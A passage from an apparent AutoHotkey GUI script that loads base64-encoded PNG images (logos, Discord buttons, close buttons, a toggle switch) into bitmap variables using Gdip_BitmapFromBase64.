LkbE1DSH84OiJLPvQk/GoorR0Qpehv5BNwq7sdkZW6bGbUx9uxP3GK41IhDCkyOE9SHkM+fjrDCe9DGl6tyFa2jC0H6qO58Xg27cZyxKbDczIIAtXnPAuJRECYfv/sUrL4ZVSge4nfCpK/pM7Q2Go2eAGVNJZmLqdAe2gal+0ni0Wu7BkMwtoZsM+KRQ/O6PtqdZwZlDhR62iTmoNS93lAAQCAtRCRp1k15Wjl98+Y2wyqOmpM89ulnz817ezMpR8x5DU4ipJaZ6Lz3MyjMPlqnmDqtXVd2k4kgqmgJGX107nmZlN+6hktcf8zlLxYnZUcxjajcu8INWIVcxRes8BEq30Iiz2vKO/UwwMUYO6UQlifzAk894n0gebyRZ78Tp53lvTowmMQgcs6gTl1gaEolu6ZyRmS3alhDQebfChqlATCWfQZTpiWq2A4ME7EdbqUBuY6Hh0VLuIdoBOhQtKMGwargSxaQGNls5n6FV5J7d+w7lRa8/2oG7XakFcTp05PRCVFx/4bUavTi7JGneibIXX/4yS7+qBARYmNyHBSFkWsdpCRtCRhL1azdf7caZ7eeNWj9IsmflWBAyteklD58qMJlnTk69E6e9JCuJd+hYGq6uHcVSpl/oH1RCMdTbhKnUdropu7Ka9yAH4SOlrR48ElotUHLgyeMkbHrw6498mxZDNGGG4H+VA82ZJCuIY/M8LT6EYbUJ5b1OXDQjTnQIh5kn5VC/NnO6mvcLvPvdP2Squ3+ZxsAq/Us/s20Ba5uZFS+fOXeJB/1ckYVhakxnBsxLHIHN6MruTQ+OI5ZO2sIy9ckkLZ45dSFczX0YaEPao5VmBZQ1wYvN2aW5dZOvL165hYbKE9CFEjI6TWp0FFPpJIrTpvepNeeJnmMqXtqcqYZtB48kecUm9bGF7o7d+zHN1VlYpr4WJUUnyjEtbC6W4z3M9HMSTJ2wyT71LU5aNs23XDUgD795mvOZwJ09//lt3bzWSmmYQrwRJk5Cc+L0c1GSxUm6c8+Bmml4++z5q/hZeV2bNOTjxGQTlKwldWoRZssLU3t9d233SZmaiJpTpnaOnzxHv24EC03Wx2xVbacophJRYO+zisWVvbgJtajiqUUCYPOuvWskNkgThsGmky9jJwsu/eBW9cBMhbgsiDZ4rWnmLVrBe8kzNP2TCRairHZVLGFMbo00tWYDUJpLgwcyVTOEqUhXHPyjyJC11qGlzmtYutDNEA7TjN/nNB+z+qebMRX9GZFjHMKuwkJM3daJFrrRM6fWa5Gyta82L32JdTi6f1CYXIsaUZzs3FM/LCKwrZuxcvpAEy+iBqPIAvsPHmYeKnF4YD5jsfrvWz3aq8wuq52plFLXZKq/KQRiKg8vfLoRrDFwdNtCC1PZ8bDvKcoeD4pevPIFSlhcaK5gtDN1z0Ebhg1M1fKxEOWQo4D0aWk3PWbfQwJG1U0XRENuk86jkn1ClNirpcZ1vbXxfWIMtnXi2upRY+qG1b8hrK6g4IOY+monarmOxTMkdYJNknNqG0sr/sXwTc/+jqmtl2KWqd2FTvf4yTpTWYKfv/xCjXOywqx+gSZ6jBtjkx26UfzEgadr2wnL1DxOWS5cmKzaszChgJjgGkyhWw52Wf1B+8/v9RPVLKdOwymlcTemPn/5pqeXyqFvK1MZdfe+p7LcZFNoGiZjgvHU4RNxVtSCRBNWk043fnb9Sm0vQXNSI12Rnjl3p2wnkh6+wCNyQfNkI6ZyyMAcmvAv3FKk/XLhRC3s6Kt4nzRJ1MOuWMguf/5lXcQ2bkjimhVyC0xlIHjT6bbfUmmz0RxLnGMpYPNtdC7Zy2JsFSU9jlkYK/1bW9GbnRhRTSVCQ4CgKRGsURzYuXEyzkpyhyuysD4/T+KHZ4BQRolhqhIktnciQ7ta3GEqMjjcLKYWvJvmGWcA467HF6LJ8g6C1eQrGwMya8rquwlTwxjgIMIAUzU15Xrs7xLGwB4oC3ExvtV+DGB3Qs6r7aOnvXV5ag5V/MhS1XCxdiZgvcBxMD7vTZimHBjJsjRn05kk2py1M5UAy19AdiknsZ2ouUmphUnfZA/KjJeeGNlflGq3VM0EJgNDpjItYYOrtvBMtdPycm1twVI0xzRCPhjv5MxBh3bWGaYy6Dx+e6a25lQcDkVqPgcENMl7TQfK56zdbLHQhLxz+5V79KxNqmGqVb55PiGA5nTS7+s8Lc+zSWOtoJYcQZJ63CizszVf7Fs91nr538JU8lYU55y1vX+h/2R5N3NCMdZmGQshLpFg1OaQ7qwa5ywfNcfZ3nY0zxkA19AVZGWUWvwAJQxKb6w4zD9NBryGYk1yizHD8a44GxQ95zJNbjZYmIMa4X2F5CfLuzgJheFEJXs97pZ+vEQATF5Pc7zRZCGwWeo02YiBmtsSoLEYCM1hCe+1cwYexhws5V/ekecduqB8N0ppUst/sw67Las/wAoKm2kMl2rOkIWatuAf73OCxQKt+U/K70ZmwtTIDejh8LGzUTrkOA9EVpgKoy5evkU6oENUfeLAIfQkyrXjHfZOlvcvLT1cTmVjQfZiSH/iwzyMXF07yszQj864j2GwUOriCEmGoJBzQ/PEp95kuSuaAjPULU6Hsny6igZ0kM/KcZqi0hLvmj8hFO+7XzI/M2IaLgtXIvYYaBiSVYoRGI2r/fSNW3fNL2HTKyrP1G6cE+PQSx5qyHal000xp9U5Chiao4nOGc1+POhhevOfy9imZ9RhbzBpZWoraMLSlBYDTvHkSE2qVm0F2XXi9PMc5PWLblNYMu+8+/5ocd/A/sGdm9jZ7O/OIAMvKFlrTrx0df2wqz9zl15qjqMXXaxo32m9vBLH5kyAcC2hCvRAFTl19eCR2mzW9hkuhpGeOS7mXEnmqPCF0qfPcICxsBAFdu87lKRsnvKz56/SNpTxoBDmFdX20chYp/lt9wAmOUFW8TJsy7vczRCHj63b36wNTUHIVA4ZWIchzXEpoU+WFK0n9NYqgxWwGUshKyuj+BdK8q7Jc/2FO1FaZTln01xXeK0d2v3oevMAB3Aaed23kg91ecIODYcwe+ErOYLpp2CFQyCPbtYhZ9k3s3ElTLiuNe40RHj9uZul+d3V/AmYNgDmz+7ut/zZHVCTe29+lV3WcLTpiYowiKnEElWePvosZmCwf/gcjHcVJUNWZo9vznTGQta4s+tX0SAU1kOTp4+eIe0js7iyB9r5Kjhqj/kpqyT2q5DQescB8jf5mInIcuNleLDn5JlLUTrIcpMj2e+nxZDUFcr4hx26cZn5uwpHMnnNZlajWJr3iU3Ylnc0t0sY2wbzhxU4hxMn8F4yK09S7Nq7hlHNcSmRLdpE4ZxWGSa8OSNaljBt7I+Nt0JJ3tkaruw8kOaDsmcXhLKcZywllLMfY2cF1RwFLOATDg/NxEBSIwc1cjTdyiFokqT4PF1c3lMbAp9funLb/u2BUUOrOQmiNe74/PYrXyn720f2zwlEKloRWaJZE9bDWJeuvkST/uBBt1Q+BoqlO1y7y6CqG/djwlZSacDAGtvmJ3P1w3TZ1jVPcLFiekgyRIwX7M9IToZMgzzpgfLgOoNdB1tk4zj1TC1g1eD87mW6ycBqgp5OVYSRYUNsflawCpih4343GUap+euyXh+yGZLxH01xr7zpP4Wv6OZusniYhFHSx1iEQ5oC7yX1YMaNZuNODTc/kMYpicfsNMyZco4MOymO9sZB0iQzF2pWE2SMz5kqST7sVQxojNWgnMG7if0NxXpy9nTMpTIHI465bAcdSS10gGNa0koKMHpe2COPBT37CWw1KRhi5nMb/azA6pka9rrQmBbYZaIjn+flZDDEWzOfK1IYGKg9a2iSQmn+LhEnP4CpSNCpJyvaCMYOSDEcMl4ILyYN5G5eACVqC3iXwDx4YY1iR3Ojhw0lJhmnQZsOEpYkAp5nMlCOCyek5D3CURALmwuhl5BUK2+7mqsH/uUThAJeBgEPSaoW2EYV5d5ShtNLKKw+gbhFOtTtVeuZgbWVpEWOTzPTv++cntW5HNLURKp6TQTZ7iXRQcJIUkuHcprAu4ZoKq9WGgIBeRsnQ8gHMNUHUtoIGhtQFcKLMYygIYEahlB5KyTgRxG8Ak7IoikGQh1CBShHyRrPAJ+tygtqCBBQc7WS79Tce6k5LvA9gFCgpptR3aImKfhOEGAsQcJUSVh9+sBDVrYQuidu3Qhqlzkc7+pzzAkMlDlh/9JB4FPCgsTAJpJ0iJeA3AUoqTWR8mErelZDedtxcyMMU2th8AoBffrhBT4lKRkG81DJPDghC1cUDOGhEtWGwip3QhY1MaBPiaEqdsl42Qik/yYNW9sKmzQHKgG+Frg6C5XYEZwVele5E9poQoiapALv+QpZoyTbf/AwjOQ4+KH9gw3HU5tWKTxyfL3XnznHo7V/vVMoeQ+VeDFBktTSm/zmof7VJGylT7UCEpafHTc3wjEVqFP1G4IS9RIilDSKT6GSeWiVUVdCrWdQa6LaECqXGNCnqujN2RbAqu/cJ4QNgRoC12Aj1NY3V1tBJTW4OguVqHkIlYNWMT8iUJXEFHXxFbKSWdkDRLHZsB46cqp21ON9/bkbZeVynrVvA5r96x2oKoTKJSaohCr15pw139tAn7a/Da0cMRuY+//2E8JVB3AVFhrMw5U24KqncKVTuH4tXJFFq3ANkvFwpUGfMhW472AI18bCFbU1BK5oTlvBVUzhSgO4ijY4iY0ybsi2QRV18dWTVXvW2J5fZ4czjqHZqFeRwRyZXKcbof6B+gfu2yIUEJzQFCpUVzWoCjjRKVzpHIfXYJgqONn5cHIPIfnTA6fxRri6TeFEG3DV/9dQgAm2+Krk6ncCAu+UUO4XWbVSD86eKVT4acF1auGKHgQnPR8zpj7qeEiDtwBkKQjJGm4GBN61HaRWCUytXC+fBj71DjfB1mHq/zeIJTZLbuBrCKXSnxBN/5fxGVMfYYh8nqziaw2iKZCwa/kI4jOmPtoQ/4DoKIi17uPhzis//fiMqVsBjonz4eQeXWzf/j9U7oRg9fU+nwAAAABJRU5ErkJggg==")
A_Args.PNG.LogoTop         := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.Logo16x16       := Gdip_BitmapFromBase64(0,1,Data.PNG "BAAAAAQCAIAAACQkWg2AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAKWSURBVDhPRVJJT1NRGP1MNC5AEO3EUAql47OPvvm+oXN9bVGCQCkt5NlaeWWwEDGgCAEJjRAkRHDhEFlocGUkLo24YOPGnb/Ahf/E+1oST+7ifPee8w33XmAY+v1ix49ty7cNy89D017RzDAMWwcmtTbmL6meWpXTFuXEqzA0BRua/c9Xf1Xnl6rC8G2KCQawNJUSVFXgOJb0kf1OIsFRqky984j7PgEOH3SPjQiRAZ5CpChyWL1YVZwORyxKYU+90n+sNNGwO9tXGBNaTX0AzZN5Y1cQCIDLJptbTfI41DRlby9tFGTZh2YaPjzpKU0IftIPYIGL9rsFDqAdwEQGCayeuie/3ElnMkYpkgx+JCQoDjjHR3hbt9vj9ZptvQAtXr/P0eP2+LxrK7HaWiIeN+pgcCyTMRGA2eAtAaBLK7BVHWHDo/kQEm/Ahfb95zdl2Zgqn0WlkhyNGNwwDA1igzWlkvh4qozSqkD2+2Z0NDcTj0aM9CgkA3DahHRuyI7gxNecLhfmDWyuRmPxKDSjRqimDUN+TMTcMIRDnF6RtML5JebHxdrGoLVTuWrh9XKoVFbcpHjdKo9n6wYzO8lx50+LUbmvrC+rxaJ8ZzQOwODE9cUzSiw3KgwNu8G1dRwIBBvq2enQ9rNUpD6cpz/SZJIW5sJTegiFw82WsDaBdl64oL1co2ka/4JKJbS1mcQEI5ngW2wyXDF6wEhlwgByIYeWlj3QNv0KfzO8iydpHGPgu6e4WAAlG2G+kOz1p7LDaHW9D9wLOx1zhxTHoYjkZSSCoLBCENhcTsqOiok4M5AJzlfR7Ix4dkY/XusBiqZduyet+78uPf3eefTbsfQad9hIjKFXu46/dL45sn/6bD9466Dp4D8rxbw8afqHDwAAAABJRU5ErkJggg==")
A_Args.PNG.BarraTop        := Gdip_BitmapFromBase64(0,1,Data.PNG "AEAAAAZCAIAAAB/8tMoAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZSURBVBhXYzA2NqYJtrWyYHB3tGEwMzYAAO2IDzPhkUQ0AAAAAElFTkSuQmCC")
A_Args.PNG.Discord         := Gdip_BitmapFromBase64(0,1,Data.PNG "E4AAAAYCAIAAADbH1ygAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAVzSURBVFhH5ZZ5U6NFEMb9MISEcAQIgZAQCHfkCBAgHIGEK5wBQjhkVw6BBcFjtWq9j9KyPMt13XV11fIoj1W8b6tcP42/pF/G15Cs4D9uap/qgu6emTfzzHT39B1Ztw1uP6pGU25H8IHQwqWh2OWhhTf/RWKXQ9FLbYF7DdlGWZ4R0Kj6w0/FDv48rfhCD8nyjIBGdW7npyQaJ5Gp9euyPCOgUZ3Z/DqJxkkkvPqBLM8IaFSnNr5MonESGVt5T5ZnBFJTnbnnm57xpwciLw8vXe2bfG5k6e1A5KXeiWfx66cpqtQno8mcbczJNpqzs03iTMCg/dehoMiZW2DTDB0KiirMecWaoYPFWplvsWtGHCm+KTAYsuMbiG8jLpr3CCmojiy9U2ityjFbTOYCGQXoeApLqkeXr6mZimqzf2N685CPTG9+xd/BudfKq7rxs/vwmY8QZ00/ZmXDsFrO2YkTVDWOin9+9xcONDe/RPyezjMTZz/Bv7B/IxR9Q+ZzlDwBfHMcOfsxSvfoY7LEVRc62sYhApE6bzTxpThSUJVdpoOzuk/NVFQ7hy8opxLOxWjKE91e1cWNiR7d+10UfpS1jupeMfXCtTd1ryU5kVJnK5eX5EQm1z7jU1BN8iNcQ2KPx6hyLeK5CSJb38pkRbVt4ACTguzpXPUG9uZ3f8NsH7yPIZlZaHXXtsyizG7/IEvq22L5hQ6DwcAv4ueKyt3+2pYZSl1H6DzHtLD/B/7h2BVHdY/bMx7Z/h6TnGLt9MYhejB6sdG3QqKhI0Ul1UW2WtG9/btN/vWJuz9Fnzv3s/xiMtWukQvi4W4HZ1/lyNEJMGKypLxJhrrHHpfJiqp4+qdfEDM4/zomV61uFapEL8r87q8tPVu28maZSTTiwd/atyMeAbcqCyvrh8QjL39w/iI6Z6ofiu7FT7aidqC4tF5WiR+26NQXMZOpcvbi6Zt6HjMw8yI6lNB9Qw/LUJ13XiYrqg53D6YEJBiIvILJ5dCEycwyVzt1QnQRGNY0TzNZ3rn2wftlrYAkl2kyB/jHnsAkw9Gn1r8Qvd4bbQvsxw5uYNoczaacfIk4SV2OD13tKplqWUU7JodNZYKb3CSZ5gud56SlutorO2WyogqIPcqAlEc2wShLFFX3neP48y3lHcEHI1vfiROxOVsJURTazMRnNCiqbk9YPF0jj2DqqeqFYJa95VnKxu56X6Km2b/JUFqqhAEmQV/q9MqQgr3SB38UCUVET1UPiYLu0UdVANc0TWljCZS5OuQqWnq3aadR6MBlyFrWwF+uRRbWtc6JX46PyegSwIpwePVDmZMEqSAkuZgpypKrPoSHYkBZI4zZMUmILpWZUfW6KqokM0lOLHUlJssoqcKQ6BwTF8V9zu78yO4R8XOgpB8KG4J2z8Qz6KMr71rtHmai81utfeeIL5nPI883eUjQ2Ul10yQKM9ktfpujhd3CkOacF0i6XUI6vsXjVEWGF6/KKeqFvKWX0HsUVYqW3o/AindYPTBsgnRVoyKkNGs5wSQ/ZcacZyUQkvxIIqy0x4Zqz/LJtc/FJBxcdUHR9YIzscc0VE8oimpD+yJXQdbRXfGXhMwrKMXPzqSFkFOnB/CHn6RbGF58i7tSfQ9+ijZPCLFDJJPh4ufSiNh4V7B+nWApsXtwUt6GYlf4ZmPHMiZVF5NegmwnRviyyMjyNboRu8uX+FIcGlV5tU4r6XI1FdJ2cwpSV44DbnR8mhFH6k/Fm8E0XxAc3eqxmpZSOBF9/TwN1f8fGlUCmj5TcbiJ0NOowkPQyvKMgEYVWIpd5AyPTUVNIJ3wzMhkqUMkjJgZgb+pnhbS/f0zi25p/HeqgC6SF0UzbnFkZf0F9sdYKfywHLkAAAAASUVORK5CYII=")
A_Args.PNG.HDiscord        := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.XClose          := Gdip_BitmapFromBase64(0,1,Data.PNG "BwAAAAWCAIAAABc9GulAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABvSURBVEhLYzCmARg1lPqA7oZ29fTZ2jtBOUgAKAiUgnKwAXyGAjUvW7EazVysgmiAgPfRjCDGRCAgHKZwg4g0EQiIiiiIcUSaCAQDZCjERCAJZ0AlcAO6RxRWI4gxF5+hNEn8ZINRQ6kPaGCosTEAeNmPBGY4+RgAAAAASUVORK5CYII=")
A_Args.PNG.HXClose         := Gdip_BitmapFromBase64(0,1,Data.PNG "BwAAAAWCAIAAABc9GulAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAB1SURBVEhL7dJBCoAgFIThbvfu4kG9i7ugXRA0IEiMokOmbYQfiWd9ULbtZp+3UB71Nx09vT+coyHCEFs0fFZD8fAVArnFIdV4fSIUEbW/aYJEEUkHFTlRRD+hUcSaLuiGvOkHVSQUt4YO+flft1Ae9TcANbsB3Xa5ri4MuhIAAAAASUVORK5CYII=")
A_Args.PNG.SwitchType1On   := Gdip_BitmapFromBase64(0,0,Data.PNG "DcAAAAcCAYAAADFsCezAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAACxIAAAsSAdLdfvwAAAkuSURBVFhHxZhpbFTXFccnYI/t8Tr2zHg89uy7Z32z2Z7FHhuv4wWD7ZY6GAhLCARCKqpWIS0RSqX2QxNVjZJPQa3aqk2bD10SVWqrpElKylIg7AaMd7N4wcZmrwL/nvvAqCOIiD0j9cNfd+bdd9+c3zvLvWcEAHgZDAZeer1eYDQaBVarVVBaWsqPNptNwHEck9pisbygUqneLSoq+lgqlfaShklDyZZMJmPjMI3n5HL5J/SbP6fffsntdpuYLcw2+s7bx0az2RwnxvRUOHqYwOVyRenhv8/Nzf1yyZIltErwf1NWVhbIlg+cTmeM2bZgODYyMI/HIyTQvVnZ2Y8evoSUwsYCKZbqjEgxlSLFYFmEzPyYarEh3eqAyOmByB1AdokaEnEe5DIpSooVUClLoFDIUZAvhlCY+siO9PR06HS698iLYgZoMpmeDkcL+ElapFMqlefmHyZkD9SZUPjy9+H8zYeo/uQYYkcHETs2hKYvBhcmWsfGlpNjiJ0YRe2hPnjefQ+aVWvgCYfRUFOF9uWt6OrqQFdnBzo7V6KtrQXV1VWw20ohJvh5uxQKxUWKLI4BPhWOyW63q2jRHFvMPCUSZUHx+s9Q3zeDDbeAnbPAD8bv4LWLN7D74vVFac8EradnfPvkMFpf3YOQz4NYmQcdzU3oIJgupo6V6FjZjk4aGSAbv9HVieZYI6xW8nrqA09Sbt6jMHWy8GQeZHoiHIGlKlWqsXlv5dg4uA+cx/N002uTd/HKhQnsOD+ObQlox8A0tpNWf3YM3s5VcChkaI5WopM8xTzEjH8kgv3f78vJo53kzY6VKxAI+JGVmfnAg0VFcw6HI4/VC6Y4OEbL8owA3xdSPKfRlNjuQdnITXzvHrCrfwpb+yax9cIUXlys+qawffAatg3NYu2RfnhX9cAuFWNFSwzt7W1oaqxHLNZAavxqNTXw961oJ0jyZFnAh4yMDB6Q6sWnrLI/5jkWpzThLZBIkUqXc/LE8BwewndpcmffNF64MIOt/dcS08Asto3cwKb+GYRe2QNjQS7ayNDW1mY0NtSR0Q8Mf7oa0Fhfh+WtLbwnbTYrWBVnlZQYGlh4xsExr2m12k/T04TIpcvan+zFepr4zsA1bBqYweYkaMvoTWwevo7lf/4MerMFVZwDbWRcfX0tGghuoaqvq+Xh6miUywt5QLVafYbCMx6Ock0nlxdBRJfEDg4NEwQ2dQ8b6C1vpFBKXLPYPHYba/tnwT3/EmxyCe+xurplCam+oZbPS6ontD2kIT8/H8RSHgdHcfpqgUQCMV3S7/oRVtPFLWTQcwNzSdH64ZtYP3oL7f88BUOgHOUWPWLNjaitrUlYDC4UCvJgLDSpoLwZB0fJ+Lu8TBEKKDm9Hx7Ehv8Aawfn0DN4PSlaO3YHa0Zuo3rv+2zzRbQiwL/5mmXVCYuFaHV1lDb9YmQSg0aj+SgOjvLteH7qUsiMZoSPX8GmaWA1wSVLay7exbNjd+Hb9UNoJfmorYmihlRNG3aiYt5jcAQ1fzwbiIPTabUTspRnUOgrR+X5OWycvI9uqm7JUs/FO/jW6G04t+6EJi8LtfTG2YkjSvtboqohMPYsjUaNbDoqEtxkPJ